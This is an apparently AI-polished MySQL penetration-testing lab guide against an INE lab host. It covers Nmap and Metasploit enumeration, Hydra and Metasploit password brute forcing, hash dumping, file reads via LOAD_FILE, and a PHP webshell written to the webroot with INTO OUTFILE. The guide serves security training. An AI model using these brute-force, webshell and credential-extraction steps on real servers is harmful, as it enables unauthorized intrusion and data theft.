# MySQL Enumeration — polished guide

This document refines your MySQL notes and demo (target: `demo.ine.local`) into a clear, practical reference with exact commands, example output, and troubleshooting. Keep in mind: only test systems you are authorized to assess.

What is MySQL?
- MySQL is a popular open-source relational database server (also see MariaDB, Percona). It listens by default on TCP port 3306.

Quick facts
- Default port: 3306/TCP
- Common clients: `mysql`, `mysqlshow`, `mysqldump`, `mysqladmin`
- Enumeration can be done with Nmap NSE scripts, Metasploit auxiliary modules, and native clients.

---

## Demo (preserved)
Target: `demo.ine.local`

High-level flow (your original steps, polished):
1. Start PostgreSQL (used by Metasploit), then start `msfconsole`.
2. Create a workspace for MySQL enumeration (e.g., `mysql_enum`).
3. Set global RHOSTS for convenience (`setg RHOSTS <ip_or_host>`).
4. Use a version-detection module to identify MySQL version.
5. Use auxiliary modules / brute-force modules to find valid credentials (`mysql_login`).
6. After obtaining credentials, authenticate with the `mysql` client and enumerate schemas/tables.

### Start services and Metasploit

```bash
# Ensure database backend for Metasploit is running (Debian/Ubuntu example)
sudo service postgresql start

# Launch Metasploit
msfconsole

# In msfconsole: create / switch workspace
msf6 > workspace -a mysql_enum
msf6 > workspace mysql_enum

# Optionally set a global RHOSTS value
msf6 > setg RHOSTS demo.ine.local
```

---

## Initial discovery (network-level)

Use Nmap to verify port/service and run MySQL NSE scripts:

```bash
# Basic port and version scan
nmap -p3306 -sV -Pn demo.ine.local

# MySQL-specific NSE scripts (info, brute, empty-password check)
nmap -p3306 --script=mysql-info,mysql-empty-password,mysql-brute -Pn demo.ine.local
```

Sample `nmap --script=mysql-info` output (trimmed):

```
PORT     STATE SERVICE VERSION
3306/tcp open  mysql   MySQL 5.7.31-0ubuntu0.18.04.1
| mysql-info:
|   Protocol version: 10
|   Version: 5.7.31-0ubuntu0.18.04.1
|   Thread ID: 7
|_  Capabilities: ...
```

Notes:
- `mysql-empty-password` tests for accounts with blank passwords (dangerous but useful discovery).
- `mysql-brute` uses a small credential list; use only with authorization.

---

## Metasploit: modules and workflow

Metasploit can detect version and attempt logins. It is useful to centralize findings into the DB and leverage `workspace` separation.

Modules commonly used (examples):
- `auxiliary/scanner/mysql/mysql_version` — identify MySQL version and banner.
- `auxiliary/scanner/mysql/mysql_login` — attempt authentication (single creds or lists).

### 1) Version detection (Metasploit)

```text
msf6 > search type:auxiliary mysql_version
msf6 > use auxiliary/scanner/mysql/mysql_version
msf6 auxiliary(mysql_version) > show options
msf6 auxiliary(mysql_version) > set RHOSTS demo.ine.local
msf6 auxiliary(mysql_version) > run
```

Example output:

```
[*] 10.10.10.10:3306 - Server version: 5.7.31-0ubuntu0.18.04.1
[*] 10.10.10.10:3306 - Protocol version: 10
```

### 2) Credential testing / brute-force (Metasploit)

```text
msf6 > search type:auxiliary mysql_login
msf6 > use auxiliary/scanner/mysql/mysql_login
msf6 auxiliary(mysql_login) > show options

# Single credential test
msf6 auxiliary(mysql_login) > set RHOSTS demo.ine.local
msf6 auxiliary(mysql_login) > set MYSQLUSER root
msf6 auxiliary(mysql_login) > set MYSQLPASS 'P@ssw0rd'
msf6 auxiliary(mysql_login) > run

# Brute/spray using files (use small lists and respect lockout policies)
msf6 auxiliary(mysql_login) > set USER_FILE /root/users.txt
msf6 auxiliary(mysql_login) > set PASS_FILE /root/passwords.txt
msf6 auxiliary(mysql_login) > set STOP_ON_SUCCESS true
msf6 auxiliary(mysql_login) > set THREADS 5
msf6 auxiliary(mysql_login) > run
```

Sample success output (example):

```
[*] 10.10.10.10:3306 - LOGIN SUCCESS: demo.ine.local - root:P@ssw0rd
[+] Credentials saved to the database
```

If Metasploit finds credentials, it will often save them to its DB for reuse by other modules.

---

## Post-auth / Post-exploitation (Metasploit + native)

Once you have valid credentials, the goal is to collect useful data and identify escalation vectors. Below are safe, practical actions you can perform with Metasploit and with native MySQL clients. Always follow rules of engagement and avoid destructive actions unless explicitly allowed.

### A. Metasploit: run SQL or dump schema/data

First, locate the right auxiliary/admin modules in msfconsole:

```text
# Search available MySQL auxiliary/admin modules
msf6 > search type:auxiliary name:mysql

# Typical module names to look for:
# auxiliary/admin/mysql/mysql_sql  -> run arbitrary SQL
# auxiliary/admin/mysql/mysql_schemadump -> dump schema (if present)
# Always run 'info <module>' to confirm options and behavior
```

Example: run arbitrary SQL using a module (replace module name if different after your search):

```text
msf6 > use auxiliary/admin/mysql/mysql_sql
msf6 auxiliary(mysql_sql) > show options
# Set target and credentials
msf6 auxiliary(mysql_sql) > set RHOSTS demo.ine.local
msf6 auxiliary(mysql_sql) > set MYSQLUSER root
msf6 auxiliary(mysql_sql) > set MYSQLPASS 'P@ssw0rd'
# Example: simple SQL query to list databases
msf6 auxiliary(mysql_sql) > set SQL 'SHOW DATABASES;'
msf6 auxiliary(mysql_sql) > run
```

Sample (example) output you might see:

```
[+] Connected to demo.ine.local:3306 as root
[*] Executing SQL: SHOW DATABASES;
[*] Results:
information_schema
mysql
performance_schema
demo_db
```

Other useful module-driven actions
- Dump schema/tables via `mysql_schemadump` (if available) or script-based extraction through `mysql_sql`.
- Use Metasploit's DB integration: credentials and results get stored and can be used by other modules.

Notes
- Module names differ by framework version—use `search` and `info` to confirm available modules in your msfinstall.
- `mysql_sql` simply executes SQL as the authenticated user; its power depends on the privileges of that account.

### B. Native MySQL: targeted post-auth commands (safe data collection)

Using the native client gives you more control and is usually faster for heavy queries and data export.

```bash
# Interactive login (recommended to avoid plaintext on cmdline)
mysql -h demo.ine.local -u root -p

# Once connected, useful commands:
-- Show current user and their grants
SELECT USER(), CURRENT_USER();
SHOW GRANTS FOR CURRENT_USER();

-- List databases and tables
SHOW DATABASES;
USE demo_db;
SHOW TABLES;

-- Inspect a table schema and limited rows
SHOW CREATE TABLE users\G
SELECT id, username, email FROM users LIMIT 10;

-- Dump schema only
mysqldump -h demo.ine.local -u root -p --no-data demo_db > demo_db_schema.sql

-- Dump full data (be mindful of size/privacy)
mysqldump -h demo.ine.local -u root -p demo_db > demo_db_full.sql
```

Examples you'll commonly run after login:

```
mysql> SELECT USER(), CURRENT_USER();
+----------------+----------------+
| USER()         | CURRENT_USER() |
+----------------+----------------+
| root@localhost | root@%         |
+----------------+----------------+

mysql> SHOW GRANTS FOR CURRENT_USER();
+----------------------------------------------------------+
| Grants for root@%                                       |
+----------------------------------------------------------+
| GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' WITH GRANT OPTION |
+----------------------------------------------------------+
```

What to look for
- `SHOW GRANTS` reveals capabilities: `FILE` privilege allows writing files (see below). `SELECT` on `mysql.*` requires elevated rights.
- Presence of app tables (users, credentials, config) often yields further credentials or secrets.

### C. File read / write vectors (requires privileges)

If the DB user has the `FILE` privilege, you may be able to read server files (via `LOAD_FILE`) or write files to the filesystem (`SELECT ... INTO OUTFILE`). These can be used to retrieve configuration files or drop webshells (only with explicit permission).

Read a file (example):

```sql
-- Read /etc/hosts (if permissions allow)
SELECT LOAD_FILE('/etc/hosts');
```

Write a simple PHP webshell into a webroot (REQUIRES FILE privilege and correct path; dangerous — only when allowed):

```sql
-- Example (dangerous): write a PHP file to webroot
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';
```

Notes and cautions
- `INTO OUTFILE` path must be writable by the MySQL server process and not existing already.
- Many systems secure MySQL and disallow FILE or restrict file paths; test carefully and document everything.

### D. Extracting password hashes and pivoting

If you have `SELECT` access to `mysql.user` (rare for low-privileged accounts), you can extract password hashes:

```sql
SELECT User, Host, authentication_string FROM mysql.user;
```

If you obtain hashes, you may attempt cracking offline (e.g., `hashcat`) — maintain chain-of-custody and follow policy.

### E. Using Metasploit for post-auth actions beyond SQL

Metasploit may have additional modules that use credentials to perform follow-up tasks (search for `auxiliary/admin/mysql` or `post/mysql`):

```text
msf6 > search mysql | grep -i post
# Example: post/mysql/manage or other post-exploitation helpers (module names vary)

msf6 > info <module_name>
# read description and required options before running
```

### F. Evidence handling and reporting

- Save query outputs and dumps to a loot folder, e.g., `loot/mysql/demo.ine.local/`.
- Use `mysqldump` for exports and compress them: `gzip demo_db_full.sql`.
- Record timestamps, commands run, and module output for reports.

### G. Escalation notes (advanced, high risk)

- UDF (User-Defined Function) or plugin-based execution: possible on some MySQL versions; requires uploading shared libraries and is high-risk. Only use when explicitly permitted.
- If MySQL runs as root (rare), file reads/writes can expose system credentials — proceed with caution.

---

## Post-authentication: native MySQL client and enumeration

Once you have valid username/password, use native MySQL tools for fast and reliable enumeration.

```bash
# Interactive login (prompts for password)
mysql -h demo.ine.local -u root -p
# Or non-interactive (be careful: exposes password on process list)
mysql -h demo.ine.local -u root -p'P@ssw0rd'

# Show databases
mysql -h demo.ine.local -u root -p'P@ssw0rd' -e 'SHOW DATABASES;'

# Show tables in a database
mysql -h demo.ine.local -u root -p'P@ssw0rd' -e 'USE target_db; SHOW TABLES;'

# Show schema for a specific table
mysql -h demo.ine.local -u root -p'P@ssw0rd' -e 'USE target_db; SHOW CREATE TABLE users\G'

# Dump schema (no data)
mysqldump -h demo.ine.local -u root -p'P@ssw0rd' --no-data target_db > schema.sql

# Dump a single table (data included)
mysqldump -h demo.ine.local -u root -p'P@ssw0rd' target_db users > users.sql
```

Sample SQL command outputs (examples):

```
$ mysql -h demo.ine.local -u root -p'P@ssw0rd' -e 'SHOW DATABASES;'
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| demo_db            |
+--------------------+
```

```
$ mysql -h demo.ine.local -u root -p'P@ssw0rd' -e 'USE demo_db; SHOW TABLES;'
+----------------+
| Tables_in_demo_db |
+----------------+
| users          |
| secrets        |
+----------------+
```

Notes & best practices:
- Avoid exposing passwords on the command line in shared systems. Prefer interactive `mysql -p` prompts or `~/.my.cnf` protected files when appropriate for testing.
- If you discover interesting data, export it (dump, CSV) and store as evidence under a loot directory.

---

## Alternative/auxiliary tools

- `mysqlshow -h <host> -u <user> -p` — list databases and tables
- `mysqladmin -h <host> -u <user> -p status` — basic server status
- `hydra` for brute-forcing (use carefully):

```bash
hydra -L users.txt -P passwords.txt -s 3306 -t 4 mysql://demo.ine.local
```

- `nmap` NSE scripts beyond `mysql-info`: `mysql-empty-password`, `mysql-brute`.

---

## Troubleshooting & common edge cases

- Remote root login disabled: many installations disable `root` remote access — try other usernames (app-specific, `www-data`, `debian-sys-maint`, `backup`).
- Bind address: MySQL may be bound to `127.0.0.1` only. If so, remote TCP enumeration will not work. Use other entries (SSH pivot or local access) if you have them.
- TLS/SSL: Some servers require SSL or use `caching_sha2_password` / `mysql_native_password` plugins — your client must support them.
- Account lockout / delays: avoid aggressive brute force; check for application-level protections.

---

## Quick cheat sheet

```bash
# Network discovery
nmap -p3306 -sV -Pn demo.ine.local
nmap -p3306 --script=mysql-info,mysql-empty-password,mysql-brute -Pn demo.ine.local

# Metasploit quick flow
msfconsole
workspace -a mysql_enum
setg RHOSTS demo.ine.local
use auxiliary/scanner/mysql/mysql_version
set RHOSTS demo.ine.local
run
use auxiliary/scanner/mysql/mysql_login
set USER_FILE users.txt
set PASS_FILE passwords.txt
run

# Native client
mysql -h demo.ine.local -u root -p
mysql -h demo.ine.local -u root -p'P@ssw0rd' -e 'SHOW DATABASES;'
mysqldump -h demo.ine.local -u root -p'P@ssw0rd' --no-data demo_db > schema.sql
```

---

## Lab walkthrough — Metasploit (Kali) step-by-step

Below is a merged, clean version of your lab steps (1–11). This is a practical walkthrough showing how to go from initial reachability checks to a variety of Metasploit MySQL auxiliary modules, plus the expected outcomes to look for.

> Note: the commands assume you are on the Kali machine (or similar) and have Metasploit installed. Replace `demo.ine.local` with the target hostname or IP as required.

### Step 1 — Open the lab (Kali)
- Access the Kali machine provided by the lab environment and open a terminal.

### Step 2 — Check reachability

```bash
ping -c 4 demo.ine.local
```

- Expected: replies confirming the host is reachable.

### Step 3 — Quick service discovery

```bash
nmap demo.ine.local
```

- Expected: Nmap shows port 3306/tcp open and service `mysql` (or similar).

### Step 4 — Run `auxiliary/scanner/mysql/mysql_version`

```text
msfconsole -q
use auxiliary/scanner/mysql/mysql_version
set RHOSTS demo.ine.local
run
```

- Expected output: MySQL version banner and protocol information (e.g., `Server version: 5.x.x`). Use this to pick compatible tools/techniques.

### Step 5 — Run `auxiliary/scanner/mysql/mysql_login` (credential testing)

```text
use auxiliary/scanner/mysql/mysql_login
set RHOSTS demo.ine.local
set USERNAME root
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
run
```

- This attempts passwords from the wordlist for the specified username. Watch for `LOGIN SUCCESS` messages. If a valid password is found, Metasploit will usually save the credential to its database.

### Step 6 — Run `auxiliary/admin/mysql/mysql_enum` (detailed enumeration)

```text
use auxiliary/admin/mysql/mysql_enum
set USERNAME root
set PASSWORD twinkle
set RHOSTS demo.ine.local
run
```

- Purpose: a quick higher-level enumeration (users, databases, privileges) using valid credentials. Look for user lists, DB names, and privilege summaries.

### Step 7 — Run `auxiliary/admin/mysql/mysql_sql` (execute arbitrary SQL)

```text
use auxiliary/admin/mysql/mysql_sql
set USERNAME root
set PASSWORD twinkle
set RHOSTS demo.ine.local
run
```

- This module runs a SQL command (configured via the module options). You can execute `SHOW DATABASES;` or other read-only queries. The module output should display result rows.

### Step 8 — Run `auxiliary/scanner/mysql/mysql_file_enum` (search for files via SQL FILE privilege)

```text
use auxiliary/scanner/mysql/mysql_file_enum
set USERNAME root
set PASSWORD twinkle
set RHOSTS demo.ine.local
set FILE_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
set VERBOSE true
run
```

- Purpose: attempt `LOAD_FILE()`/`INTO OUTFILE` style checks to enumerate readable/writable files when the account has `FILE` privileges. Inspect module output for discovered file contents or indications of access.

### Step 9 — Run `auxiliary/scanner/mysql/mysql_hashdump` (hash collection)

```text
use auxiliary/scanner/mysql/mysql_hashdump
set USERNAME root
set PASSWORD twinkle
set RHOSTS demo.ine.local
run
```

- Purpose: attempt to dump authentication information from `mysql.user` or related tables. Output may contain authentication strings or hashed credentials (if privileges allow). Handle hashes per policy — do not crack without permission.

### Step 10 — Run `auxiliary/scanner/mysql/mysql_schemadump` (dump schema)

```text
use auxiliary/scanner/mysql/mysql_schemadump
set USERNAME root
set PASSWORD twinkle
set RHOSTS demo.ine.local
run
```

- Purpose: extract database schemas (CREATE statements). Useful for understanding data structure and identifying tables of interest.

### Step 11 — Run `auxiliary/scanner/mysql/mysql_writable_dirs` (discover writable dirs)

```text
use auxiliary/scanner/mysql/mysql_writable_dirs
set RHOSTS demo.ine.local
set USERNAME root
set PASSWORD twinkle
set DIR_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
run
```

- Purpose: attempts to find filesystem directories the MySQL process can write to (may enable `INTO OUTFILE` attacks). Use results responsibly and only with explicit permission.

---

## Conclusion
In this lab we exercised multiple Metasploit MySQL modules covering version discovery, credential testing, high-level enumeration, SQL execution, file enumeration, hash dumping, schema extraction, and writable-directory discovery. Together, these modules provide a comprehensive view of what an authenticated or partially authenticated attacker could do against a MySQL server.

Always treat any extracted data (hashes, schema dumps, files) as sensitive. Follow your engagement rules for storage, cracking, or reporting.

---

## References
- MySQL documentation: https://dev.mysql.com/doc/
- Metasploit modules used (Rapid7 module pages):
  - https://www.rapid7.com/db/modules/auxiliary/scanner/mysql/mysql_version
  - https://www.rapid7.com/db/modules/auxiliary/scanner/mysql/mysql_login
  - https://www.rapid7.com/db/modules/auxiliary/admin/mysql/mysql_enum
  - https://www.rapid7.com/db/modules/auxiliary/admin/mysql/mysql_sql
  - https://www.rapid7.com/db/modules/auxiliary/scanner/mysql/mysql_file_enum
  - https://www.rapid7.com/db/modules/auxiliary/scanner/mysql/mysql_hashdump
  - https://www.rapid7.com/db/modules/auxiliary/scanner/mysql/mysql_schemadump
  - https://www.rapid7.com/db/modules/auxiliary/scanner/mysql/mysql_writable_dirs

---

If you'd like, I can now:
- Create a small `tools/mysql-lab-replay.sh` script that automates the safe non-destructive steps (ping, nmap, mysql_version) and saves results to `loot/mysql/demo.ine.local/`.
- Add inline example screenshots or textual sample outputs into the doc for each module (I included brief expectations above).

Which follow-up should I do?

